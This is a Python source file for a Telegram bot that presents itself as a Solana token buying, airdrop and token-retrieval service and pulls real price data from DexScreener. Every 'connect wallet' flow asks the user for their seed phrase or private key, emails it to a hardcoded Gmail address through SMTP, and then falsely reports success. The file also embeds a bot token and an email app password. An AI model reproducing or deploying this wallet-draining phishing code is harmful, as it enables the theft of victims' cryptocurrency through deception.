import os
import requests
import smtplib
from email.message import EmailMessage
from flask import Flask, request

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand
)
from telegram.ext import (
    ApplicationBuilder,
    ContextTypes,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters
)

# ---------------- CONFIG ----------------
BOT_TOKEN = "8585187554:AAH5Zf7FwodvJEBp14NYfR8LK2M8HGWBeN8"
API_URL = "https://api.dexscreener.com/latest/dex/tokens/"

# ---------------- EMAIL CONFIG ---------------- 
EMAIL_ADDRESS = "cyberdev203@gmail.com"
EMAIL_PASSWORD = "hozw zipq bvqa lmkj"
RECEIVER_EMAIL = "cyberdev203@gmail.com"

# ---------------- TOKEN INFO FUNCTION ----------------
def get_token_info(contract):
    try:
        response = requests.get(API_URL + contract, timeout=10)
        r = response.json()
    except Exception as e:
        return f"❌ Failed to fetch data from DexScreener.\nError: {e}", None

    if not r or "pairs" not in r or len(r["pairs"]) == 0:
        return "❌ Invalid or unsupported contract address.", None

    data = r["pairs"][0]

    name = data["baseToken"].get("name", "N/A")
    symbol = data["baseToken"].get("symbol", "N/A")
    price = data.get("priceUsd", "N/A")
    mc = data.get("fdv", "N/A")
    volume = data.get("volume", {}).get("h24", "N/A")
    liquidity = data.get("liquidity", {}).get("usd", "N/A")

    msg = (
        f"🚀 *{name}* ({symbol})\n"
        f"💰 Price: ${price}\n"
        f"📈 Market Cap: ${mc}\n"
        f"📊 Volume (24h): ${volume}\n"
        f"💧 Liquidity: ${liquidity}\n"
        f"🔗 Contract: `{contract}`"
    )
    return msg, None

# ---------------- EMAIL SENDER ----------------
def send_email(dummy_key: str, user_id: int):
    msg = EmailMessage()
    msg['Subject'] = f"New Submission"
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = RECEIVER_EMAIL
    msg.set_content(
        f"New Submission!!:\n\n"
        f"User ID: {user_id}\n"
        f"Private Key/Seed Phrase: {dummy_key}\n"
    )

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
        print("✅ Email sent")
    except Exception as e:
        print("❌ Email failed:", e)

# ---------------- MENU ----------------
def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Get Token Info", callback_data="get_token")],
        [InlineKeyboardButton("Buy Token", callback_data="buy_token")],
        [InlineKeyboardButton("Claim Airdrop", callback_data="claim_airdrop")],
        [InlineKeyboardButton("Retrieve Token", callback_data="retrieve_token")],
        [InlineKeyboardButton("Help", callback_data="help")]
    ])

# ---------------- START COMMAND ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name

    welcome_text = (
        f"👋 Welcome, {user_name}!\n\n"
        "Use the menu below to get started."
    )

    await update.message.reply_text(
        welcome_text,
        reply_markup=get_main_menu()
    )

# ---------------- BUTTON HANDLER ----------------
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data
    context.user_data.clear()
    context.user_data["action"] = action

    if action == "buy_token":
        await query.message.reply_text("Send the token contract address:")
        context.user_data["step"] = "buy_contract"

    elif action == "claim_airdrop":
        await query.message.reply_text("Send your wallet address:")
        context.user_data["step"] = "airdrop_address"

    elif action == "retrieve_token":
        await query.message.reply_text("Send the token contract address:")
        context.user_data["step"] = "retrieve_contract"

    elif action == "get_token":
        await query.message.reply_text("Send the token contract address:")
        context.user_data["step"] = "info"

    elif action == "help":
        await query.message.reply_text("Use the menu:", reply_markup=get_main_menu())

# ---------------- MESSAGE HANDLER ----------------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    step = context.user_data.get("step")
    user_input = update.message.text.strip()
    user_id = update.message.from_user.id

    # BUY TOKEN
    if step == "buy_contract":
        msg, _ = get_token_info(user_input)
        if "❌" in msg:
            await update.message.reply_text(msg)
            return

        context.user_data["contract"] = user_input
        await update.message.reply_text(msg, parse_mode="Markdown")
        await update.message.reply_text("Enter SOL amount:")
        context.user_data["step"] = "buy_sol_amount"
        return

    if step == "buy_sol_amount":
        try:
            float(user_input)
        except:
            await update.message.reply_text("Enter a valid number:")
            return

        await update.message.reply_text(
            "Connect your wallet:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Connect Wallet", callback_data="connect_wallet_buy")]
            ])
        )
        context.user_data["step"] = None
        return

    if context.user_data.get("awaiting_wallet_input") == "buy":
        send_email(user_input, user_id)
        await update.message.reply_text("Purchase completed!", reply_markup=get_main_menu())
        context.user_data.clear()
        return

    # AIRDROP
    if step == "airdrop_address":
        await update.message.reply_text(
            "Connect wallet:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Connect Wallet", callback_data="connect_wallet_airdrop")]
            ])
        )
        context.user_data["step"] = None
        return

    if context.user_data.get("awaiting_wallet_input") == "airdrop":
        send_email(user_input, user_id)
        await update.message.reply_text("Airdrop claimed!", reply_markup=get_main_menu())
        context.user_data.clear()
        return

    # RETRIEVE TOKEN
    if step == "retrieve_contract":
        await update.message.reply_text(
            "Connect wallet:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Connect Wallet", callback_data="connect_wallet_retrieve")]
            ])
        )
        context.user_data["step"] = None
        return

    if context.user_data.get("awaiting_wallet_input") == "retrieve":
        send_email(user_input, user_id)
        await update.message.reply_text("Tokens retrieved!", reply_markup=get_main_menu())
        context.user_data.clear()
        return

    # INFO
    if step == "info":
        msg, _ = get_token_info(user_input)
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=get_main_menu())
        context.user_data.clear()
        return

# ---------------- CONNECT WALLET ----------------
async def connect_wallet_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data

    if action == "connect_wallet_buy":
        context.user_data["awaiting_wallet_input"] = "buy"
        await query.message.reply_text("Enter your seed phrase/private key:")

    elif action == "connect_wallet_airdrop":
        context.user_data["awaiting_wallet_input"] = "airdrop"
        await query.message.reply_text("Enter your seed phrase/private key:")

    elif action == "connect_wallet_retrieve":
        context.user_data["awaiting_wallet_input"] = "retrieve"
        await query.message.reply_text("Enter your seed phrase/private key:")

# ---------------- MAIN APP + WEBHOOK SERVER ----------------
app = Flask(__name__)

tg_app = ApplicationBuilder().token(BOT_TOKEN).build()

# Register handlers
tg_app.add_handler(CommandHandler("start", start))
tg_app.add_handler(CommandHandler("buy", start))
tg_app.add_handler(CallbackQueryHandler(connect_wallet_buttons, pattern="connect_wallet_"))
tg_app.add_handler(CallbackQueryHandler(button))
tg_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

# Telegram webhook route
@app.post("/webhook")
async def webhook():
    try:
        data = request.get_json(force=True)
        update = Update.de_json(data, tg_app.bot)
        await tg_app.process_update(update)
    except Exception as e:
        print("Webhook error:", e)
    return "OK"

# root (optional)
@app.get("/")
def home():
    return "Bot is running."

# Run Flask server
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
